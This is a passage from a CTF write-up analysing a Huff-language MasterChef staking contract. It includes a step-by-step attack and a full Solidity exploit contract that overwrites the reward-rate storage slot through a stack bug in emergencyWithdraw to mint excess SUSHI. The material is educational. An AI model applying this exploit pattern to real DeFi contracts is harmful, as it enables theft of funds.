have a position tracked by:<ul><li><strong>amount</strong>: The quantity of LP tokens the user has staked<li><strong>rewardDebt</strong>: A checkpoint value used to calculate pending rewards (explained below)</ul><p>Reward distribution parameters :<ul><li><strong>sushiPerBlock</strong>: The amount of SUSHI tokens minted and distributed per block<li><strong>totalAllocPoint</strong>: Sum of all pool allocation points, used to calculate each pool's proportional share<li><strong>bonusEndBlock</strong>: Block number where bonus rewards end<li><strong>BONUS_MULTIPLIER</strong>: Multiplier (10x) applied to rewards during the bonus period</ul><p>Instead of tracking individual rewards for each user (which would be gas-prohibitive), Cheff uses an elegant accumulated rewards approach:<ol><li><p><strong>Pool-Level Accumulation</strong>: Each pool maintains <code>accSushiPerShare</code> which represents the total SUSHI rewards accumulated per LP token since the pool's inception.</p><li><p><strong>Periodic Updates</strong>: When <code>updatePool()</code> is called (triggered by deposits, withdrawals, or manual calls), the contract:</p> <ul><li>Calculates blocks elapsed since <code>lastRewardBlock</code><li>Determines the block multiplier (10x during bonus period, 1x after)<li>Computes new SUSHI rewards: <code>multiplier  sushiPerBlock  pool.allocPoint  totalAllocPoint</code><li>Mints new SUSHI: 10% to developer, 100% to the Cheff contract<li>Updates <code>accSushiPerShare</code>: adds <code>(newRewards  1e12)  lpSupply</code> to the existing value<li>Updates <code>lastRewardBlock</code> to current block</ul></ol><p>The <code>rewardDebt</code> is a checkpoint that prevents users from claiming rewards they didn't earn:<ul><li><p><strong>On Deposit</strong>: <code>rewardDebt = user.amount  pool.accSushiPerShare  1e12</code></p> <ul><li>This records the accumulated rewards "baseline" at deposit time</ul><li><p><strong>Pending Rewards Calculation</strong>:</p></ul><pre style=color:#323232;background-color:#fff><code><span>  pending = (user.amount  pool.accSushiPerShare  1e12) - user.rewardDebt
</span></code></pre><ul><li><p>This gives only the rewards accumulated since the user's last interaction</p><li><p><strong>On Withdrawal</strong>: After claiming pending rewards, <code>rewardDebt</code> is recalculated based on remaining stake</p><li><p><strong>emergencyWithdraw(pid)</strong>: Allows users to withdraw all LP tokens without claiming rewards.</p></ul><h2 id=breaking-the-cheff-huff>Breaking the Cheff.huff</h2><h3 id=challenge-goal>Challenge Goal</h3><p>The objective is to accumulate more than 1,000,000 SUSHI tokens (1,000,000 * 10^18 wei) in the player's wallet. The <code>isSolved()</code> function verifies success by checking if <code>sushi.balanceOf(player) > 1_000_000 * 1e18</code> returns true. The player address is set during contract deployment and cannot be changed, requiring exploitation of the contract's vulnerabilities to extract sufficient SUSHI rewards without legitimate staking.<h3 id=the-vulnerability>The Vulnerability</h3><p>The critical bug resides in the <code>EMERGENCY_WITHDRAW()</code> function's final storage reset sequence. After emitting the EmergencyWithdraw event via <code>log3</code>, the function attempts to zero out the user's position by resetting <code>user.amount</code> and <code>user.rewardDebt</code> to 0. However, incorrect stack manipulation using <code>swap3</code> and <code>swap1</code> operations causes a catastrophic misalignment.<p><strong>Intended Behavior:</strong><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span>storage[user_slot] = 0        </span><span style=color:#969896;font-style:italic>// Reset user.amount to 0
</span><span>storage[user_slot + 1] = 0    </span><span style=color:#969896;font-style:italic>// Reset user.rewardDebt to 0
</span></code></pre><p><strong>Actual Behavior:</strong><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#969896;font-style:italic>// Stack after log3: [user.amount, user_slot, user.rewardDebt]
</span><span>0x00                          </span><span style=color:#969896;font-style:italic>// [0x00, user.amount, user_slot, user.rewardDebt]
</span><span>swap3                         </span><span style=color:#969896;font-style:italic>// [user.rewardDebt, user.amount, user_slot, 0x00]
</span><span>swap1                         </span><span style=color:#969896;font-style:italic>// [user.amount, user.rewardDebt, user_slot, 0x00]
</span><span>sstore                        </span><span style=color:#969896;font-style:italic>// storage[user.amount] = user.rewardDebt @audit-issue : BUG
</span><span>sstore                        </span><span style=color:#969896;font-style:italic>// storage[user_slot] = 0x00 
</span></code></pre><p>The first <code>sstore</code> uses <code>user.amount</code> as the storage slot key instead of <code>user_slot</code>, writing <code>user.rewardDebt</code> to an arbitrary storage location. The second <code>sstore</code> correctly zeros <code>user.amount</code>, but the damage is done.<h3 id=exploitation-strategy>Exploitation Strategy</h3><p>By depositing a carefully chosen amount <code>X</code> into any pool, an attacker controls which storage slot gets overwritten during <code>emergencyWithdraw()</code>. For example:<ul><li>Deposit <code>amount = 0</code>  <code>storage[0] = user.rewardDebt</code>  Overwrites <code>SUSHI_SLOT</code><li>Deposit <code>amount = 1</code>  <code>storage[1] = user.rewardDebt</code>  Overwrites <code>DEVADDR_SLOT</code><li>Deposit <code>amount = N</code>  <code>storage[N] = user.rewardDebt</code>  Overwrites slot N</ul><p>The goal is to accumulate over 1,000,000 SUSHI tokens. The most effective target is slot 3 (<code>SUSHI_PER_BLOCK_SLOT</code>). Corrupting <code>sushiPerBlock</code> to an astronomically large value causes the contract to mint excessive rewards on subsequent pool updates.<p>Two values must be controlled:<ol><li><code>user.amount = 3</code> determines which slot gets overwritten<li><code>user.rewardDebt</code> determines the value written to that slot</ol><p>The <code>rewardDebt</code> is calculated as:<pre style=color:#323232;background-color:#fff><code><span>rewardDebt = user.amount  pool.accSushiPerShare  1e12
</span></code></pre><p>To maximize <code>rewardDebt</code>, we need <code>accSushiPerShare</code> to be extremely large. The <code>accSushiPerShare</code> grows according to:<pre style=color:#323232;background-color:#fff><code><span>accSushiPerShare += (sushiReward  1e12)  lpSupply
</span></code></pre><p>When <code>lpSupply</code> equals 1 wei, every reward gets multiplied by 1e12 before accumulation. This is the key insight: deposit the minimum possible LP to inflate <code>accSushiPerShare</code> rapidly.<h3 id=attack-sequence>Attack Sequence</h3><p><strong>Step 1</strong>: Approve LP tokens for the Cheff contract.<p><strong>Step 2</strong>: Deposit 1 wei of LP tokens into pool 0. This sets <code>lpSupply = 1</code>, maximizing the rate at which <code>accSushiPerShare</code> accumulates.<p><strong>Step 3</strong>: Wait for blocks to pass. Each block accumulates rewards as:<pre style=color:#323232;background-color:#fff><code><span>sushiReward = multiplier  sushiPerBlock  allocPoint  totalAllocPoint
</span><span>accSushiPerShare += sushiReward  1e12  1
</span></code></pre><p>With <code>lpSupply = 1</code>, the <code>accSushiPerShare</code> grows by approximately <code>1e30</code> or more per block during the bonus period.<p><strong>Step 4</strong>: Deposit 2 additional wei of LP tokens. This updates <code>user.amount</code> to 3 and recalculates <code>rewardDebt</code>:<pre style=color:#323232;background-color:#fff><code><span>user.amount = 1 + 2 = 3
</span><span>user.rewardDebt = 3  accSushiPerShare  1e12
</span></code></pre><p>With <code>accSushiPerShare  1e35</code>, the resulting <code>rewardDebt  3e23</code>.<p><strong>Step 5</strong>: Call <code>emergencyWithdraw(0)</code>. The buggy storage operation executes:<pre style=color:#323232;background-color:#fff><code><span>storage[3] = user.rewardDebt  // sushiPerBlock = 3e23
</span></code></pre><p>The contract returns the 3 wei of LP tokens to the attacker.<p><strong>Step 6</strong>: Deposit the remaining LP tokens (approximately 1 ether minus 3 wei) into pool 0.<p><strong>Step 7</strong>: Wait for one block to pass, then call <code>withdraw(0, 0)</code> to claim rewards without withdrawing LP. With <code>sushiPerBlock = 3e23</code>, a single block generates:<pre style=color:#323232;background-color:#fff><code><span>sushiReward = 10  3e23  100  100 = 3e24 SUSHI
</span></code></pre><p>This exceeds the 1,000,000 SUSHI (1e24 wei) threshold required to solve the challenge.<p>An alternative attack vector targets slot 2 (<code>BONUS_END_BLOCK_SLOT</code>). By setting <code>user.amount = 2</code> and triggering the bug, the attacker overwrites <code>bonusEndBlock</code> with a large value, extending the 10x bonus multiplier indefinitely. This approach requires more blocks to accumulate sufficient rewards but avoids direct manipulation of the reward rate.<h2 id=the-exploit>The Exploit</h2><div class=note-container><button class=note-toggle><div class=note-icon><p>Exploit POC</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {ICheff} from "./ICheff.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC20</span><span>} from "./</span><span style=color:#0086b3>IERC20</span><span>.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Exploit </span><span>{
</span><span>    ICheff </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>cheff;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> lpToken;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> sushi;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_cheff, </span><span style=color:#0086b3>address </span><span>_lpToken, </span><span style=color:#0086b3>address </span><span>_sushi) {
</span><span>        cheff </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>ICheff</span><span>(_cheff);
</span><span>        lpToken </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_lpToken);
</span><span>        sushi </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_sushi);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>attack</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 1: Approve LP tokens
</span><span>        lpToken.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(cheff), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 2: Deposit 1 wei to minimize lpSupply
</span><span>        </span><span style=color:#969896;font-style:italic>// This maximizes accSushiPerShare growth rate
</span><span>        cheff.</span><span style=color:#62a35c>deposit</span><span>(0, 1);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 3: Blocks pass naturally on testnet
</span><span>        </span><span style=color:#969896;font-style:italic>// accSushiPerShare inflates due to lpSupply = 1
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 4: Deposit 2 more wei to set user.amount = 3
</span><span>        </span><span style=color:#969896;font-style:italic>// rewardDebt = 3  accSushiPerShare  1e12
</span><span>        cheff.</span><span style=color:#62a35c>deposit</span><span>(0, 2);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 5: Trigger the bug
</span><span>        </span><span style=color:#969896;font-style:italic>// storage[user.amount] = user.rewardDebt
</span><span>        </span><span style=color:#969896;font-style:italic>// storage[3] = huge value  corrupts sushiPerBlock
</span><span>        cheff.</span><span style=color:#62a35c>emergencyWithdraw</span><span>(0);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 6: Deposit remaining LP tokens
</span><span>        </span><span style=color:#0086b3>uint256</span><span> remaining </span><span style=color:#a71d5d;font-weight:700>=</span><span> lpToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        cheff.</span><span style=color:#62a35c>deposit</span><span>(0, remaining);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>claim</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// Step 7: Claim rewards after one block passes
</span><span>        cheff.</span><span style=color:#62a35c>withdraw</span><span>(0, 0);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Transfer SUSHI to caller/player
</span><span>        sushi.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, sushi.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>    }
</span><span>}
</span></code></pre></div></div><p>The exploit splits into two transactions: <code>attack()</code> sets up the corrupted state, and <code>claim()</code> harvests rewards after at least one block passes. The separation ensures the pool updates with the inflated <code>sushiPerBlock</code> value before claiming.<h2 id=conclusion>Conclusion</h2><p>Huff enables gas optimization beyond what Solidity can achieve, but eliminates the compiler's safety guardrails. Stack manipulation errors like incorrect <code>swap</code> or <code>dup</code> operations can silently corrupt storage in ways that high-level languages prevent through type systems and automatic storage management. Use Huff only when gas savings justify the increased audit cost and development complexity, typically for hot paths in high-throughput contracts like DEX routers or optimized libraries. For most applications, Solidity's safety features and developer tooling provide better long-term maintainability.<h2 id=references>References</h2><ul><li><a href=https://docs.huff.sh/get-started/>Huff documentation</a><li>CTF writeups to learn EVM internals : <a href=https://themj0ln1r.github.io/archive/hackedlabsctf/>1</a>, <a href=https://themj0ln1r.github.io/archive/tcp1pctf/>2</a> , <a href=https://themj0ln1r.github.io/archive/ethernaut/#18-magic-number>3</a>, <a href=https://themj0ln1r.github.io/archive/backdoorctf24/>4</a><li><a href=https://dev.to/heymarkkop/understanding-sushiswaps-masterchef-staking-rewards-1m6f>How MasterChef reward calculations works</a><li><a href="https://www.youtube.com/watch?v=Rfaabjj7n9k">EVM Through HUFF: Devtooligan</a><li><a href=https://github.com/devtooligan/awesome-huff>devtooligan/awesome-huff</a></ul></section></article></main></div>